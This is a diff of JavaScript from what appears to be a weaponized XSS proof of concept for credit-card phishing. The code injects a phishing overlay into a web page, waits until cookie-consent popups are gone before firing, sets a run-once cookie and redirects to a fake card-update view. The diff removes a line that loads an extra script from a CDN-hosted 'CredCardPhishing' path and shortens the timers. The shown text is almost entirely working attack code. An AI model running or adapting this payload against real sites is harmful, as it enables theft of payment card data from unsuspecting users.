@@ -138,11 +138,10 @@ function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-  with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS/CredCardPhishing/ext.js';
   setTimeout(() => {
     window.location.href = window.location.href.split('#')[0] + '#ccupdate';
   },
-  1000);
+  10);
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
@@ -157,13 +156,12 @@ function checkDOM() {
   }
   if ((popupElements1[0] != undefined) || (popupElements2[0].getAttribute('aria-label') == 'cookieconsent')) {
     console.log('[*] DOM popups NOT deleted');
-    setTimeout(() => { checkDOM(); }, 100);
+    setTimeout(() => { checkDOM(); }, 10);
   } else {
     console.log('[*] DOM popups deleted');
     startPoC();
   }
 }
-checkDOM();
 function startPoC() {
   // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
   if ((runOnce) && !(/^(.*;)?\s*ccPhi\s*=\s*[^;]/.test(document.cookie))) {
@@ -178,4 +176,5 @@ function startPoC() {
     execPayld();
   }
 }
+checkDOM();
 // EoF
